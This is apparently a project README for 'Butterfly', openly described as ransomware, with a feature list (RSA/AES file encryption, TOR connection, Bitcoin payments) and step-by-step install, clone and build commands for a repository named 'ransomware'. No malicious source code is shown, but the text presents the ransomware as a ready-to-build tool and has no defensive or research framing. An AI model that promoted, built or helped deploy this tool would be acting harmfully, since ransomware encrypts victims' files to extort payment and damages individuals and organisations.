# Butterfly
Butterfly is a ransomware that makes you cry

- Hybrid Encryption (RSA Asymmetric/AES Symmetric Encryption)
- Supports multiple operating systems
- Offline Encryption
- Supports over .. file extensions
- Connection to the TOR network
- Python Webserver
- Bitcoin payments


## Prerequisites

Ensure that git and cmake are installed
<pre><code>
sudo apt-get install git cmake
</code></pre>

Download and install GTest
<pre><code>
sudo apt-get install libgtest-dev
cd /usr/src/gtest
sudo cmake CMakeLists.txt
sudo make

#copy or symlink libgtest.a and libgtest_main.a to your /usr/lib folder
sudo cp *.a /usr/lib
</code></pre>

Download and install boost libraries
<pre><code>
sudo apt-get install -y libboost-filesystem-dev libboost-regex-dev libboost-log-dev
</code></pre>

## Build Butterfly

Build butterfly
<pre><code>
git clone https://github.com/bierschi/ransomware.git
cd ransomware
mkdir build
cmake ..
make
</code></pre>

## Usage and Examples

Print the available arguments for Butterfly
<pre><code>
butterfly --help
</code></pre>


## Logs

logs can be found in `/var/log/ransomware`

## Troubleshooting


## Changelog
All changes and versioning information can be found in the [CHANGELOG](https://github.com/bierschi/ransomware/CHANGELOG.rst)